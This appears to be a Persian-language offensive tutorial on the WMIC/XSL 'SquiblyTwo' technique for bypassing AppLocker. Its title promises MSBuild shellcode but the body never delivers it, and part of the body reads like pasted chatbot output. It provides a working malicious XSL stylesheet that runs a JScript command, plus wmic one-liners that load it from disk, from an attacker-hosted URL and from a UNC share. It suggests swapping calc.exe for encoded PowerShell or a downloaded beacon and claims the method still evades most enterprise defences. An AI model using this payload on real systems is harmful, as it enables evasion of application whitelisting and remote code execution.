
[[Using MSBuild to Execute Shellcode in C sharp]]

در تکنیک قبلی ما یاد گرفتیم که ساختن یک فایل xml مخرب  و کامپایل کردن توسط msbuild میتونیم تا حد امکان بیایم فرایند Evasion و bypass Applocker رو انجام بدیم 

حالا توی این تکنیک قراره با یکی دیگر از تکنیک های Bypass applocker اشنا بشیم 

---

فایل های XML برای اینکه تبدیل به یک خروجی ماننده html یا json و یا موارد دیگری بشوند احتیاج به یک واسطی دارند که این فرایند رو انجام به دهد این واسط eXtensible Stylesheet Language یا همون XSL است 

## XSL 
این یک زبان است برای:

### ✔ تبدیل کردن XML

### ✔ شکل دادن به XML

### ✔ فرمت‌بندی کردن XML

### ✔ تولید خروجی مثل HTML، TEXT، XML جدید، JSON و …

یعنی XSL مانند یک **CSS برای XML** است،  
اما خیلی قوی‌تر و با قابلیت **تبدیل (Transformation)**.


---

# 🟥 **XSLT چیست و چه ربطی به XSL دارد؟**

**XSLT = XSL Transformations**  
(بخش اصلی XSL است)

به این معنی:

- XSL = زبان
    
- XSLT = بخش تبدیل XSL
    

پس عملاً وقتی می‌گوییم **XSL** یا **XSLT**، منظورمان بیشتر **XSLT** است.

### ✔ 3) خواندن XML بدون XSL سخت و زشت است

XSL باعث می‌شود **ساختار XML زیبا و خوانا** شود.

### ✔ XSLT می‌تواند کد اجرا کند

در بعضی شرایط، XSLT می‌تواند:

- فایل از اینترنت دانلود کند
    
- فایل بخواند
    
- Process اجرا کند
    
- Shell بزند
    

برای همین:

⭐ **XSL می‌تواند در حملات Fileless استفاده شود.**

مثلاً XML + XSL → اجرای Payload  
یا اجرای کد از طریق MSXML

# 🟩 خلاصه XSL در 10 ثانیه:

> **XSL یک زبان است که برای تبدیل و نمایش XML استفاده می‌شود. می‌تواند XML را به HTML، JSON، XML جدید و انواع خروجی تبدیل کند. در DevOps، Backend، و حتی حملات سایبری کاربردهای مهمی دارد.**

---

باشه، دقیقاً فقط همون تکنیک اصلی که خودت آوردی (یعنی همان چیزی که Casey Smith

@subTee

در سال ۲۰۱۶–۲۰۱۷ معرفی کرد) رو بدون هیچ اضافه‌کاری توضیح می‌دم:تکنیک اصلی: WMIC + XSL (معروف به SquiblyTwo)هدف  
اجرای کد دلخواه (JScript یا VBScript) بدون استفاده از powershell.exe، cmd.exe، regsvr32، rundll32 و … در محیط‌هایی که Application Whitelisting (AppLocker یا WDAC) فعال است.چرا کار می‌کند؟

- wmic.exe یک فایل سیستمی signed توسط مایکروسافته و همیشه در لیست سفید است.
- پارامتر /FORMAT: به wmic اجازه می‌ده یک فایل XSL بدهی که توسط موتور XSLT مایکروسافت (msxml) پردازش می‌شه.
- داخل فایل XSL می‌تونی تگ <ms:script language="JScript"> بذاری و کد جاوااسکریپت دلخواه اجرا کنی.
- این کد جاوااسکریپت توسط wmic.exe → svchost.exe (به صورت grandchild) اجرا می‌شه، بنابراین Parent Process همیشه svchost.exe هست → اکثر EDRها و AppLocker این زنجیره را مشکوک نمی‌بینند.

اجرای دقیق همون تکنیک کلاسیک (۲۰۱۶–تا امروز هنوز کار می‌کند)۱. فایل evil.xsl روی دیسک بساز (یا روی وب‌سرور بگذار):

xml

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]>
    </ms:script>
</stylesheet>
```

۲. فقط این یک خط را اجرا کن:

cmd

```text
wmic os get /format:"C:\path\to\evil.xsl"
```

یا از راه دور (بدون ساخت فایل روی دیسک قربانی):

cmd

```text
wmic os get /format:"http://attacker.com/evil.xsl"
```

یا UNC path:

cmd

```text
wmic os get /format:"\\ATTACKBOX\share\evil.xsl"
```

آنچه واقعاً اتفاق می‌افتد

1. wmic.exe فراخوانی می‌شه (signed و whitelisted)
2. wmic به موتور msxml می‌گه این XSL رو پردازش کند
3. msxml تگ ms:script را می‌بیند و کد JScript را در حافظه اجرا می‌کند
4. calc.exe (یا هر چیز دیگری) توسط svchost.exe spawn می‌شه

نکات مهم همون تکنیک اصلی

- نیازی به forfiles یا elastic-endpoint.exe به عنوان parent نیست؛ خودش به تنهایی کار می‌کند.
- هر دستور wmic که /format داشته باشد کار می‌کند (os get، process list، node، …)
- می‌تونی به جای calc.exe هر چیزی بگذاری: cmd.exe، powershell.exe -enc …، دانلود و اجرای beacon و غیره.
- هنوز در سال ۲۰۲۵ روی اکثر محیط‌های Enterprise با AppLocker فعال بدون آلارم کار می‌کند (به شرطی که HTTP/S یا SMB به خارج یا وب‌سرور داخلی اجازه داشته باشد).

خلاصه یک خطی دقیقاً همان چیزی که

@subTee

معرفی کرد:

cmd

```text
wmic os get /format:"https://yourserver.com/evil.xsl"
```

همین! هیچ چیز اضافه‌ای لازم نیست.